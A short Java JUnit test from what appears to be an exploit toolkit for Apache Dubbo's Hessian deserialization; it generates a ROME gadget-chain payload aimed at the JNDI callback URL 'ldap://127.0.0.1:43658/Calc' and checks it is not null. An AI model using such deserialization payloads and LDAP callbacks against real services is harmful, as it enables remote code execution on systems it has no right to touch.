package com.threedr3am.exp.dubbo.payload.hessian;

import com.threedr3am.exp.dubbo.payload.Payloads;
import org.junit.Assert;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.junit.runners.JUnit4;

/**
 * @author threedr3am
 */
@RunWith(JUnit4.class)
public class RomePocTest {

    @Test
    public void getPayload() throws Exception {
        Object payload = Payloads.ROME.getPayload().getPayload(new String[]{"ldap://127.0.0.1:43658/Calc"});
        Assert.assertNotNull(payload);;
    }
}